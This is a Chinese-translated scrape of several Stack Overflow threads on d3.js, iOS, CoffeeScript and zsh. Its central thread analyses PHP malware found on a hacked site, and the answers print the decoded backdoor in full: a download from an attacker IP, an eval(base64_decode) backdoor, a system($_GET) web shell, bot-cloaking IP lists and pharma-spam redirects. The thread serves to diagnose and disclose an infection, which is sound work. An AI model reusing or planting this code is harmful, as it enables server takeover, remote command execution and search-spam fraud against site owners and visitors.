@Yaron Naveh 提供的链接中的示例似乎是[Mercator projection](http://en.wikipedia.org/wiki/Mercator_projection "墨卡托投影")。[您可以在d3.js API](https://github.com/mbostock/d3/wiki/Geo-Projections "d3.js API - 地理投影")中找到有关 d3.js 的墨卡托投影工具的更多信息。@mbostock 也很友好地为 API 中的每个投影创建块/要点（单击投影缩略图以获取示例）。这是一个简单的墨卡托投影[块](http://bl.ocks.org/2869760 "墨卡托块")/[要点](https://gist.github.com/2869760 "墨卡托要点")的链接。

关于“提问的艺术——你感觉如何？” 链接，这里有一些代码与@mbostock 所说的有关使用填充样式作为数据函数进行着色的内容。在这个例子中，我只是在 JSON 文件中为国家名称的第一个字符选择 unicode 值，并使用“steelblue”（#4682B4 = 4620980）作为种子（你可能会想要计算色调/色调）。

```
d3.json("readme.json", function(collection) {
  d3.select("svg").selectAll("path")
      .data(collection.features)
    .enter().append("path")
      .attr("d", d3.geo.path().projection(d3.geo.mercator()))
      .style("fill", function(d) { return '#'+Math.floor(d.properties.name.charCodeAt(0)/100*4620980).toString(16); });
}); 
```

您可以在此处查看完整示例作为[块](http://bl.ocks.org/4121134 "彩色块")/[要点](https://gist.github.com/4121134 "彩色要点")。

（@mbostock - 感谢您提供如此出色的工具！）

# php - 无法解码此黑客代码

> ID：12648038
> 
> 赞同：0
> 
> 时间：2012-09-28T22:12:00.620
> 
> 标签：php

今天我的网站被黑了，这是我发现的一个 php 脚本：[https](https://docs.google.com/open?id=0B7aEugGV1GwTNnd2c2Fqei1vakE) ://docs.google.com/open?id=0B7aEugGV1GwTNnd2c2Fqei1vakE 。

我将 eval 更改为在此代码中打印，但我无法解码脚本的源代码。

我想看看这个脚本在我的网站上做了 1 周。由于这些脚本的站点拒绝攻击最终改变了 .htaccess 代码，我发现了这一点。

我什至尝试使用脚本名称和注释行在 Google 中找到任何已知的常见威胁，但我没有找到。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T22:46:58.050

### 免责声明

> 解码后我到达了[http://pastebin.com/VGqeGDkH](http://pastebin.com/VGqeGDkH)。请不要在您的系统上运行上述代码......因为它不是唯一会下载到您的系统的罚款。

黑客发送`curl`或`file_get_contents`请求：

```
curl_setopt($vH5wU9kS8uO3wG9xI7wR5aV1fS3vU2qC2bA6yP9oG2uZ1zF7zZ5dR8gI0tJ3jV3oB0cD1iN6dD1vL8gL2uP4fX0yU2tF4bR8qD1xB2pL7eS9kW2rI7vD1dS5oA4iP9jH6, CURLOPT_URL, "$pO6oA9pF4aY2lO7dY9vK3sU7nL8lF4gL1dY7uD8mU4xH9gM2hR9gT8tA6dJ1aB9sA8wP3sO5zI8xR2eZ0aD4dK7uQ0rG7aA7nI6kZ3kI3tG5$cO9qE4hY7wW5rJ7qL1bN7uP0dE2zE9rB2bV6lY3sJ8eO3rN3pR0tA8mA0qR1oK2dE9qM3yH0kB1wU1qX2pJ0bS5xV4mG7pY1pI6iK8eP8xY3yX2$kI8yO6lP1lN7wX0fV2kY1zI9vO3mS6wK3lT9gH9rE6tZ8xT6dE7wG4dP5iJ0mC7bX0zJ3tO1iD0eD2hE4cJ0pG4gZ1bC8lT5jM1iK8hD3$tV3uB4lG2gC9iV5fE4bJ3lC6mO1sN2hE7tH0gA0iC9cT5eR4pE2aW4nA7qI5oA8uW7mZ2fE6cQ7rB9cR0xG4gY9rM9hC2rN1$tV3uB4lG2gC9iV5fE4bJ3lC6mO1sN2hE7tH0gA0iC9cT5eR4pE2aW4nA7qI5oA8uW7mZ2fE6cQ7rB9cR0xG4gY9rM9hC2rN1$fK3iD2pY6sG1xV5wB5wU8pJ1hP2qW7wZ5sI1kS4pN0pO7bD1fE1vZ2aL3pV0uZ2fI3eQ4kI9aD8wN5bF0jR8aQ8sN6rD0pV6sM4uJ7zK6aW5dR4bC7$tV3uB4lG2gC9iV5fE4bJ3lC6mO1sN2hE7tH0gA0iC9cT5eR4pE2aW4nA7qI5oA8uW7mZ2fE6cQ7rB9cR0xG4gY9rM9hC2rN1$zP3dW5gU5bS0sO7aO2cQ5tD0eV6cD9rW9sJ9jM0kO6zK8wL8hL9xU3zI1gJ7xT2rX9tO9wD6gL0pV5eD2rT4hL2uP1jB9sE2cU0fG6gJ1zM0pM2vS1wZ8lQ7uN8qA6eY0$qM2xA6eC8gQ2lE0qQ8eM7xT2dV5sS1aW2wH3qL5dG5sF3fI4zA1xG9gN9xV7fO4zT5qV2yU1gC2lR2vB1hF5dO6gC9xH6aC1wA6$zV0mR4mU2lH5iU0qI9iN1vM6eU2uO2qJ2fH4mY7wK1kH5nR0fE4yV8rI0vR3lM3zW2jK8cG3dX4zM3oQ8iK0iK7yS1fY0oE4yZ3xN7iI4sN6"); 
```

解码后你会得到

```
curl_setopt($ch, CURLOPT_URL, "http://95.211.128.197/100JS71MLKpzPzFbcYeVvZUMxCRUKBVFFx6iO6pr2VfhBthyzGcp.txt"); 
```

然后，这将下载文件和不同的后门到系统..

黑客还使用了很多先进的方法，例如加密、变量递归和大量备份。他还确保最终的机器人没有被谷歌、雅虎、微软公司、亚马逊、UCSD.EDU、印第安纳大学、索尼克发现。 .net 、 MCAFEE INTERNATIONAL 和 hz

**我的建议**

联系您的托管公司或安全专家..`Your server needs to be checked`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T23:00:42.180

这是一个搜索引擎去优化器。它会将恶意文字注入您网站的内容中。因此，当机器人（如 Google 机器人）出现为您的网站编制索引时，它会将这些词与您的网站相关联。

这是它下载的文件的代码

**别跑**

```
 $sutra = "http://95.211.128.197/tds";           // TDS Url
    $scheme = "default";                            // TDS Cheme
    $www_root = "http://95.211.128.197";            // Manager path

    $host=$_SERVER['HTTP_HOST'];
    $agent=$_SERVER['HTTP_USER_AGENT'];
    $server_accept_language = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];
    $server_user_agent = @$_SERVER['HTTP_USER_AGENT'];
    $server_referer = @$_SERVER['HTTP_REFERER'];
    $server_host = @$_SERVER['HTTP_HOST'];
    $server_forwarded_for = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $server_remote_addr = @$_SERVER['REMOTE_ADDR'];
    $server_query_string = @$_SERVER['QUERY_STRING'];
    $server_signature = @$_SERVER['SERVER_SIGNATURE'];
    $server_request = @$_SERVER['REQUEST_URI'];

    $debug = false;
    if ($server_remote_addr == "108.170.8.174"){$debug = true;} 

    if ($debug) 
        {
            echo "<title>DOOR OK</title>";
            echo "originalurl=$originalurl<br>";
            echo "server_user_agent=$server_user_agent<br>";
            echo "server_referer=$server_referer<br>";
            echo "server_host=$host<br>";
            echo "server_remote_addr=$server_remote_addr<br>";
            echo "server_request=$server_request<br>";
            echo "www_root=$www_root<br><br>";

            echo "Check CURL extension...";
            if (extension_loaded('curl'))
                {
                    echo "<font color=green><b>YES</b></font><br><br>";
                }
                else
                {
                    echo "<font color=red><b>NO</b></font><br><br>";
                }   
        }   

    // Some bad guys :)

    if (eregi ("start=56",$server_referer))
    {
        exit();
    }

    if ($agent == "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)")
    {
        exit();
    }   

    if ($agent == "Mozilla/4.0")
    {
        exit();
    }   

    if (eregi("75.125.",$server_remote_addr))
    {
        exit();
    }

    if (eregi("41.190.",$server_remote_addr))
    {
        exit();
    }   

    if (eregi("143.215.169",$server_remote_addr))
    {
        exit();
    }       

if (eregi("75.55.",$server_remote_addr))
    {
        exit();
    }       

if (eregi("67.212.",$server_remote_addr))
    {
        exit();
    }

if (eregi("173.236.",$server_remote_addr))
    {
        exit();
    }

if (eregi("184.154.",$server_remote_addr))
    {
        exit();
    }

if ($server_remote_addr == '194.115.120.14')
    {
        exit();
    }   
//////////////////////////////////////////////////////////////////////////////

if((md5($_REQUEST["img_id"]) == "ae6d32585ecc4d33cb8cd68a047d8434") && isset($_REQUEST["mod_content"])) { eval(base64_decode($_REQUEST["mod_content"])); exit(); }

$cmd = $_GET['cmddd'];
if (isset($cmd))
    {
        system($cmd);   
        exit();
    }

@$is_human = @detectBot($server_user_agent,$server_remote_addr,$server_query_string,$server_referer);

if (@$is_human==false) 
                    {
                    $folder = str_replace("www.","",$host);
                    if (($server_request=="") || ($server_request=="/"))
                        {
                            $filename = "index.php";    
                        }
                        else
                        {
                            $filename = str_replace("_","",$server_request);
                            $filename = str_replace("_","",$filename);
                            $filename = str_replace(" ","",$filename);
                            $filename = str_replace("%","",$filename);
                            $filename = str_replace("|","",$filename);
                            $filename = str_replace("/","",$filename);
                            $filename = str_replace(";","",$filename);
                            $filename = str_replace("+","",$filename);
                            $filename = str_replace("?","",$filename);
                            $filename = str_replace(".","",$filename);
                            $filename = str_replace("=","",$filename);
                            $filename1 = str_replace("&","",$filename);
                            $filename2 = str_replace("&","amp",$filename);
                            $filename1 = $filename1.".php";
                            $filename2 = $filename2.".php";
                        }                       
                    if (extension_loaded('curl'))
                        {
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, "$www_root/pages/$folder/$filename1");
                            curl_setopt($ch, CURLOPT_HEADER, 0);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            $remote_page = curl_exec($ch);
                            $ch2 = curl_init();
                            curl_setopt($ch2, CURLOPT_URL, "$www_root/pages/$folder/$filename2");
                            curl_setopt($ch2, CURLOPT_HEADER, 0);
                            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
                            $remote_page2 = curl_exec($ch2);
                            $ch2 = curl_init();
                            //curl_setopt($ch2, CURLOPT_URL, "$www_root/_links/doors.php");
                            curl_setopt($ch2, CURLOPT_URL, "$www_root/pages/$folder/doors.txt");
                            curl_setopt($ch2, CURLOPT_HEADER, 0);
                            curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
                            $links_map = curl_exec($ch2);   
                            if (eregi ("Not Found", $links_map))
                                {
                                    $links_map = "";
                                }
                        }
                        else
                        {
                            $remote_page = file_get_contents("$www_root/pages/$folder/$filename1");
                            $remote_page2 = file_get_contents("$www_root/pages/$folder/$filename2");
                            $links_map = file_get_contents("$www_root/pages/$folder/doors.txt");
                            if (eregi ("Not Found", $links_map))
                                {
                                    $links_map = "";
                                }                           
                            //$links_map = file_get_contents("$www_root/_links/doors.php");
                        }

                        if (eregi('<h2>', $remote_page))
                            {
                                echo $remote_page."<!-- End HTML 3.51.197 -->";
                                exit;
                            }
                        if (eregi('<h2>', $remote_page2))
                            {
                                echo $remote_page2."<!-- End HTML 3.51.197 -->";
                                exit;
                            }
                            else
                            {
                                // NIHT :)
                                $originalurl="http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
                                $originaluseragent="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;";
                                if (extension_loaded('curl'))
                                    {
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $originalurl);
                                        curl_setopt($ch, CURLOPT_USERAGENT, $originaluseragent);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        $originalpage = curl_exec($ch);     
                                    }
                                    else
                                    {   
                                        $originalpage = @file_get_contents($originalurl);
                                    }

                                if (preg_match('/<body.*?>/i',$originalpage)) {
                                    $originalpage=preg_replace('/href=([\'"]{0,1})http.*?>/i', '>', $originalpage);
                                    $originalpage=preg_replace('/(<body.*?>)/i', "<body>$links_map", $originalpage, 1);
                                } elseif (preg_match('/<\/body>/i',$originalpage)) {
                                    $originalpage=preg_replace('/href=([\'"]{0,1})http.*?>/i', '>', $originalpage);
                                    $originalpage=preg_replace('/(<\/body>)/i', "$links_map</body>", $originalpage, 1);
                                }
                                print $originalpage."<!-- End HTML 3.51.197 -->";
                                exit;                               
                                //echo '<font id="mix" color="8a517f" style="height: 0;overflow: hidden;width: 0; position: absolute; font-family:courier; font-size:19px">'
                                //echo $links_map;
                                //'</font>';
                            }
                    }
                    else
                    {
                    $keys = "/acai|diet|weight|loss|pharmac|drug|lunesta|provigil|modafinil|proventil|accutane|cialas|aciphex|acomplia|acyclovir|adalat|albendazole|albenza|albuterol|aldactone|alendronate|allegra|altace|amaryl|amiloride|amlodipine|amoxicillin|ansaid|arava|arcoxia|atenolol|atorvastatin|avandia|avapro|avodart|aygestin|azathioprine|azithromycin|baclofen|bactrim|benazepril|benzodiazepine|biaxin|bisoprolol|bromocriptine|bupropion|calan|carbamazepine|carisoprodol|carvedilol|ceclor|cefaclor|cefpodoxime|celebrex|celecoxib|cetirizine|chlorambucil|cialis|clarinex|clarithromycin|claritin|clopidogrel|colospa|conjugated|coreg|coumadin|coversyl|cyproheptadine|danazol|danocrine|desloratadine|desyrel|digoxin|dilantin|dipyridamole|domperidone|dutasteride|effexor|eldepryl|enalapril|epivir|erythromycins|escitalopram|esomeprazole|estrace|estradiol|ethambutol|etoricoxib|evista|ezetimibe|famciclovir|famvir|felodipine|fenofibrate|fexofenadine|finasteride|flagyl|flavoxate|flomax|floxin|fluoxetine|flurbiprofen|fosamax|frumil|furosemide|gabapentin|gemfibrozil|geodon|glimepiride|glipizide|glucophage|glucotrol|hydroch|hytrin|hyzaar|ibuprofen|ilosone|imdur|imitrex|imuran|indapamide|inderal|irbesartan|isordil|isosorbide|kamagra|ketoconazole|lamictal|laminuvide|lamisil|lamotrigine|lanoxin|lansoprazole|lasix|leflunomide|lenor72|leukeran|levaquin|levitra|levlen|levofloxacin|levonorgestrel|levothroid|levothyroxine|lexapro|lioresal|lipitor|lisinopril|lopid|lopressor|loratadine|losartan|lotensin|lovastatin|loxapine|loxitane|lozol|mebeverine|medroxy|mefenamicacid|meloxicam|meridia|metformin|metoclopramide|metoprolol|metronidazole|mevacor|mexiletine|mexitil|microzide|minipress|mobic|montelukast|motilium|motrin|myambutol|nabumetone|naprosyn|naproxen|neurontin|nexium|nifedipine|nimodipine|nimotop|niravam|nizoral|nolvadex|norethindrone|norplant72|nortriptyline|norvasc|ofloxacin|omeprazole|orlistat|oseltami|pamelor|pantoprazole|parlodel|paroxetine|paxil|periactin|perindropril|persantine|phenergan|phenytoin|plavix|plendil|ponstel|prandin|pravachol|pravastatin|prazosin|prednisolone|prednisone|premarin|prevacid|prilosec|prograf|promethazine|propafenone|propecia|propranolol|proscar|protonix|provera|prozac|rabeprazole|raloxifene|ramipril|ranitidine|reductil|reglan|relafen|repaglinide|retrovir|rimonabant|risperdal|risperidone|rivotril|rosiglitazonemaleate|roxithromycin|rulide|rythmol|selegiline|sertraline|sibutramine|sildenafil|simvastatin|singulair|soma|spironolactone|stavudine|sulfamet|sumatriptan|sumycin|synthroid|tacrolimus|tadalafil|tamiflu|tamoxifen|tamsulosin|tegaserod|tegretol|tenormin|terazosin|terbinafine|tetracycline|topamax|topiramate|trazodone|tricor|trimox|urispas|valacyclovir|valtrex|vantin|vardenafil|vasotec|venlafaxine|verapamil|viagra|warfarin|xenical|zantac|zebeta|zelnorm|zerit|zestril|zetia|zidovudine|zimulti|ziprasidone|zithromax|zocor|zoloft|zovirax|zyban|zyrtec|ambien|phentermine|xanax|valium|tramadol|adipex|zolpidem|ativan|alprazolam|diazepam|klonopin|lorazepam|clonazepam|ultram|zopiclone|modalert|hair|vicodin|amoxil|atomoxetine|cipro|ciprofloxacin|clomid|clomiphene|deltasone|diflucan|doxycycline|fluconazole|isotretinoin|pentazine|septra|strattera/i";

                    if (strlen($_SERVER["HTTP_REFERER"]) < 30)
                        {

                        if (eregi ("google", $_SERVER["HTTP_REFERER"]))
                            {
                        $key = "unknown";
                        $host_new = str_replace("www.","",$host);
                        if (extension_loaded('curl'))
                            {
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, "$www_root/_scripts/human.php");
                            curl_setopt($ch, CURLOPT_HEADER, 0);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_POST, 1);
                            $data = array(
                            'domain' => $host_new, 
                            'uri' => $server_request,
                            'se' => $sese,
                            'referrer' => $_SERVER["HTTP_REFERER"],
                            'agent' => $agent,
                            'server_remote_addr' => $server_remote_addr,
                            'keys' => $key
                            );
                            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                            curl_exec($ch);
                            }
                            else
                            {   
                            @file_get_contents("$www_root/_scripts/human.php?domain=$host_new&uri=$server_request&se=$sese&keys=$key&agent=$agent&server_remote_addr=$server_remote_addr&referrer=".$_SERVER["HTTP_REFERER"]);
                            }                       

                            $location = "$sutra/in.cgi?$scheme";
                            header("Location: ".$location);
                            exit;                           
                            }
                        }

/**                 if ((eregi ("url=", $server_referer)) AND (preg_match('/google/i', $server_referer)))
                        {
                        $key = "unknown, https";
                        $host_new = str_replace("www.","",$host);
                        if (extension_loaded('curl'))
                            {
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, "$www_root/_scripts/human.php");
                            curl_setopt($ch, CURLOPT_HEADER, 0);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_POST, 1);
                            $data = array(
                            'domain' => $host_new, 
                            'uri' => $server_request,
                            'se' => $sese,
                            'referrer' => $_SERVER["HTTP_REFERER"],
                            'agent' => $agent,
                            'server_remote_addr' => $server_remote_addr,
                            'keys' => $key
                            );
                            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                            curl_exec($ch);
                            }
                            else
                            {   
                            @file_get_contents("$www_root/_scripts/human.php?domain=$host_new&uri=$server_request&se=$sese&keys=$key&agent=$agent&server_remote_addr=$server_remote_addr&referrer=".$_SERVER["HTTP_REFERER"]);
                            }                       

                            $location = "$sutra/in.cgi?$scheme";
                            header("Location: ".$location);
                            exit;                           
                        }                       
*/
                    if (preg_match($keys, $_SERVER["HTTP_REFERER"])) 
                        {
                        $key = $_SERVER["HTTP_REFERER"];
                        $sese="unknown";
                        if (eregi("yahoo", $_SERVER["HTTP_REFERER"]))
                            {
                                $keys = explode ("p=", $_SERVER["HTTP_REFERER"]);
                                $keys = explode ("&", $keys[1]);
                                $key = $keys[0];        
                                $sese="yahoo";
                            }
                        if (eregi("google", $_SERVER["HTTP_REFERER"]))
                            {
                                $keys = explode ("q=", $_SERVER["HTTP_REFERER"]);
                                $keys = explode ("&", $keys[1]);
                                $key = $keys[0];
                                $sese="google"; 
                            }
                        if (eregi("bing", $_SERVER["HTTP_REFERER"]))
                            {
                                $keys = explode ("q=", $_SERVER["HTTP_REFERER"]);
                                $keys = explode ("&", $keys[1]);
                                $key = $keys[0];
                                $sese="bing";   
                            }   
                        if (eregi("aol.com", $_SERVER["HTTP_REFERER"]))
                            {
                                $keys = explode ("q=", $_SERVER["HTTP_REFERER"]);
                                $keys = explode ("&", $keys[1]);
                                $key = $keys[0];
                                $sese="aol";    
                            }
                        if (eregi("ask.com", $_SERVER["HTTP_REFERER"]))
                            {
                                $keys = explode ("q=", $_SERVER["HTTP_REFERER"]);
                                $keys = explode ("&", $keys[1]);
                                $key = $keys[0];
                                $sese="ask";    
                            }               

                        $host_new = str_replace("www.","",$host);
                        if (extension_loaded('curl'))
                            {
                            $ch = curl_init();
                            curl_setopt($ch, CURLOPT_URL, "$www_root/_scripts/human.php");
                            curl_setopt($ch, CURLOPT_HEADER, 0);
                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                            curl_setopt($ch, CURLOPT_POST, 1);
                            $data = array(
                            'domain' => $host_new, 
                            'uri' => $server_request,
                            'se' => $sese,
                            'referrer' => $_SERVER["HTTP_REFERER"],
                            'agent' => $agent,
                            'server_remote_addr' => $server_remote_addr,
                            'keys' => $key
                            );
                            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                            curl_exec($ch);
                            }
                            else
                            {   
                            @file_get_contents("$www_root/_scripts/human.php?domain=$host_new&uri=$server_request&se=$sese&keys=$key&agent=$agent&server_remote_addr=$server_remote_addr&referrer=".$_SERVER["HTTP_REFERER"]);
                            }

                            $location = "$sutra/in.cgi?$scheme¶meter=".$key."&se=".$host."&HTTP_REFERER=".$_SERVER["HTTP_REFERER"];
                            //$location = "http://health-profile.net/";
                            header("Location: ".$location);
                            exit;
                    }

                    }
////////////////////////////////////////////////////////////////////////////////////////////////////
function detectBot($server_user_agent,$server_remote_addr,$server_query_string,$server_referer){

    $is_human = true;

    $stop_ips_masks = array(
        "/^8\.6\.4[8-9]\.[0-9]+$/",             // NetRange:    8.6.48.0 - 8.6.55.255           Google Inc
        "/^8\.6\.5[0-5]\.[0-9]+$/",             // NetRange:    8.6.48.0 - 8.6.55.255           Google Inc
        "/^64\.233\.1[6-8][0-9]\.[0-9]+$/",     // NetRange:    64.233.160.0 - 64.233.191.255   Google Inc
        "/^64\.233\.19[0-1]\.[0-9]+$/",         // NetRange:    64.233.160.0 - 64.233.191.255   Google Inc
        "/^64\.68\.8[0-7]\.[0-9]+$/",           // NetRange:    64.68.80.0 - 64.68.87.255       Google Inc
        "/^66\.249\.6[4-9]\.[0-9]+$/",          // NetRange:    66.249.64.0 - 66.249.95.255     Google Inc
        "/^66\.249\.[7-8][0-9]\.[0-9]+$/",      // NetRange:    66.249.64.0 - 66.249.95.255     Google Inc
        "/^66\.249\.9[0-5]\.[0-9]+$/",          // NetRange:    66.249.64.0 - 66.249.95.255     Google Inc
        "/^72\.14\.19[2-9]\.[0-9]+$/",          // NetRange:    72.14.192.0 - 72.14.255.255     Google Inc
        "/^72\.14\.2[0-5][0-9]\.[0-9]+$/",      // NetRange:    72.14.192.0 - 72.14.255.255     Google Inc
        "/^74\.125\.[0-9]+\.[0-9]+$/",          // NetRange:    74.125.0.0 - 74.125.255.255     Google Inc
        "/^74\.6\.[0-9]+\.[0-9]+$/",            // NetRange:    74.6.0.0 - 74.6.255.255         Google Inc
        "/^216\.239\.3[2-9]\.[0-9]+$/",         // NetRange:    216.239.32.0 - 216.239.63.255   Google Inc
        "/^216\.239\.4[0-9]\.[0-9]+$/",         // NetRange:    216.239.32.0 - 216.239.63.255   Google In
        "/^216\.239\.6[0-3]\.[0-9]+$/",         // NetRange:    216.239.32.0 - 216.239.63.255   Google Inc
        "/^209\.85\.12[8-9]\.[0-9]+$/",         // NetRange:    209.85.128.0 - 209.85.255.255   Google Inc
        "/^209\.85\.1[3-9][0-9]\.[0-9]+$/",     // NetRange:    209.85.128.0 - 209.85.255.255   Google Inc
        "/^209\.85\.2[0-5][0-9]\.[0-9]+$/",     // NetRange:    209.85.128.0 - 209.85.255.255   Google Inc
        "/^64\.9\.22[4-9]\.[0-9]+$/",           // NetRange:    64.9.224.0 - 64.9.255.255       Google Inc
        "/^64\.9\.2[3-4][0-9]\.[0-9]+$/",       // NetRange:    64.9.224.0 - 64.9.255.255       Google Inc
        "/^64\.9\.25[0-5]\.[0-9]+$/",           // NetRange:    64.9.224.0 - 64.9.255.255       Google Inc
        "/^66\.102\.[0-9]\.[0-9]+$/",           // NetRange:    66.102.0.0 - 66.102.15.255      Google Inc
        "/^66\.102\.1[0-5]\.[0-9]+$/",          // NetRange:    66.102.0.0 - 66.102.15.255      Google Inc      
        "/^137\.110\.[0-9]+\.[0-9]+$/",         // NetRange:    137.110.222.*                   Google bot
        "/^65\.5[2-5]\.[0-9]+\.[0-9]+$/",       // NetRange:    65.52.0.0 - 65.55.255.255       Microsoft Corp
        "/^67\.195\.[0-9]+\.[0-9]+$/",          // NetRange:    67.195.0.0 - 67.195.255.255     Yahoo! Inc
        "/^209\.131\.3[2-9]\.[0-9]+$/",         // NetRange:    209.131.32.0 - 209.131.63.255   Yahoo! Inc
        "/^209\.131\.[4-5][0-9]\.[0-9]+$/",     // NetRange:    209.131.32.0 - 209.131.63.255   Yahoo! Inc
        "/^209\.131\.[6][0-3]\.[0-9]+$/",       // NetRange:    209.131.32.0 - 209.131.63.255   Yahoo! Inc
        "/^66\.163\.1[6-8][0-9]\.[0-9]+$/",     // NetRange:    66.163.160.0 - 66.163.191.255   Yahoo! Inc
        "/^66\.163\.19[0-1]\.[0-9]+$/",         // NetRange:    66.163.160.0 - 66.163.191.255   Yahoo! Inc
        "/^184\.72\.[0-9]+\.[0-9]+$/",          // NetRange:    184.72.0.0 - 184.73.255.255     AMAZON
        "/^184\.73\.[0-9]+\.[0-9]+$/",          // NetRange:    184.72.0.0 - 184.73.255.255     AMAZON
        "/^198\.134\.135\.[0-9]+$/",            // NetRange:    198.134.135.0 - 198.134.135.255 UCSD.EDU
        "/^129\.79\.49\.[0-9]+$/",              // NetRange:    129.79.49.249                   Indiana University
        "/^69\.12\.216\.[0-9]+$/",              // NetRange:    69.12.216.14                    Sonic.net
        "/^62\.189\.112\.[0-9]+$/",             // NetRange:    62.189.112.0 - 62.189.112.255   MCAFEE INTERNATIONAL
        "/^79\.178\.31\.[0-9]+$/",              // NetRange:    79.178.31.165                   hz
        "/^78\.46\.70\.[0-9]+$/",               // NetRange:    78.46.70.145                    hz
        "/^87\.98\.215\.[0-9]+$/",              // NetRange:    87.98.215.155                   hz
        "/^64\.34\.165\.[0-9]+$/",              // NetRange:    64.34.165.218                   hz
        "/^93\.186\.20\.[0-9]+$/",              // NetRange:    93.186.20.13                    hz
        "/^204\.118\.31\.202$/",
        "/^74\.81\.89\.114$/",
        "/^82\.192\.91\.10$/",
        "/^192\.251\.226\.206$/",
        "/^95\.211\.27\.[0-9]+$/",
        "/^95\.211\.129\.[0-9]+$/",
        "/^95\.211\.128\.[0-9]+$/",
        "/^128\.163\.16\.[0-9]+$/",             // NetRange:    128.163.16.*                    UKY
        "/^91\.217\.162\.[0-9]+$/",
        "/^91\.220\.35\.[0-9]+$/",
        "/^195\.14\.112\.[0-9]+$/",
        "/^86\.55\.210\.[0-9]+$/",
        "/^184\.173\.219\.[0-9]+$/",
        "/^184\.172\.169\.[0-9]+$/",
        "/^50\.22\.89\.[0-9]+$/",
        "/^64\.120\.249\.[0-9]+$/",
        "/^46\.37\.184\.[0-9]+$/",
        "/^10\.48\.17\.[0-9]+$/",
        "/^108\.170\.8\.[0-9]+$/",
        "/^64\.120\.227\.[0-9]+$/"
    );

    $stop_ips_masks_count = count ($stop_ips_masks);

    for($w=0; $w<$stop_ips_masks_count; $w++)
        {
            if(preg_match($stop_ips_masks[$w], $server_remote_addr))
                {
                    $is_human = false;  break;
                }
        } 

    $stop_agents_masks = "/google|bot|rambler|yandex|yahoo|freebsd|libwww|spider|linux/i";
    if (preg_match($stop_agents_masks, $server_user_agent)) 
        {
            $is_human = false;
        }

//  if  (strlen ($server_user_agent) < 12)
//      {
//          $is_human = false;
//      }

    return $is_human;
} 
```

# cocos2d-iphone - xcode 4.5 应用程序窗口在应用程序启动结束时应该有一个根视图控制器

> ID：12648043
> 
> 赞同：1
> 
> 时间：2012-09-28T22:12:40.013
> 
> 标签：cocos2d-iphone, ios6, xcode4.5, kobold2d

我刚开始为我的新 iphone 5 开发游戏，但每次在我的设备上构建游戏时，我都会在控制台中收到此警告。

```
Application windows are expected to have a root view controller at the end of application launch 
```

我在网上搜索了一个修复程序，但我发现的所有内容都说要放置这行代码：

```
window.rootViewController = rootViewController; 
```

在这种方法中：

`-(BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions`

但是这样做的问题是在 cocos2d 中必须注释掉这行代码，因为无论选择什么方向，它都会导致应用程序以纵向模式启动。那么有人知道解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:33:18.753

这可能与解决您的问题完全无关，但不久前我开始使用 iOS 6.0 时遇到了同样的错误。

我在启动时使用该方法`- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation`对我的视图进行了一些初始化，但后来我发现它在 iOS 6.0 中已被弃用（如此[处](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIViewController_Class/DeprecationAppendix/AppendixADeprecatedAPI.html#//apple_ref/occ/instm/UIViewController/shouldAutorotateToInterfaceOrientation%3a)所述）导致该方法从未像以前那样被调用。

如果这是您的情况，您可以简单地实现以下内容：

`- (void)willAnimateRotationToInterfaceOrientation:(UIInterfaceOrientation)toInterfaceOrientation duration:(NSTimeInterval)duration { [self shouldAutorotateToInterfaceOrientation:toInterfaceOrientation]; }`

# node.js - 扩展 Node.js 类时的花括号

> ID：12648054
> 
> 赞同：27
> 
> 时间：2012-09-28T22:14:25.990
> 
> 标签：node.js, coffeescript

`{EventEmitter} = require 'events'`为什么我们在扩展 Node.js 类时将变量包装在花括号中，例如？

例如，Trevor Burnham 在他的 Event-Driven CoffeeScript[教程](http://pragprog.com/magazines/2011-08/decouple-your-apps-with-eventdriven-coffeescript)中，以这种方式扩展了 Node 的 EventEmitter：

```
{EventEmitter} = require 'events'

class Rooster extends EventEmitter
  constructor: ->
    @on 'wake', -> console.log 'COCKADOODLEDOO!'

(foghorn = new Rooster).emit 'wake' # COCKADOODLEDOO! 
```

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2012-09-28T22:24:10.377

这：

```
{EventEmitter} = require 'events' 
```

相当于这个 JavaScript：

```
var EventEmitter;
EventEmitter = require('events').EventEmitter; 
```

当您`require 'events'`使用模块的导出返回一个对象时，其中一个导出是`EventEmitter`“类”。Using`{EventEmitter}`只是一个惯用的快捷方式，用于拉出返回`EventEmitter`的对象`require 'events'`；你也可以这样说：

```
EventEmitter = require('events').EventEmitter 
```

若你宁可。当您想要提取对象的多个部分时，支撑版本开始派上用场。例如，这个：

```
{a, b} = c 
```

就像这样的 JavaScript：

```
var a, b;
a = c.a;
b = c.b; 
```

CoffeeScript 文档的[Destructuring Assignment](http://coffeescript.org/#destructuring)部分现在可能会成为一些很好的阅读材料。

# shell - 如何让 Zsh 显示 RVM gemset？

> ID：12648059
> 
> 赞同：5
> 
> 时间：2012-09-28T22:15:19.153
> 
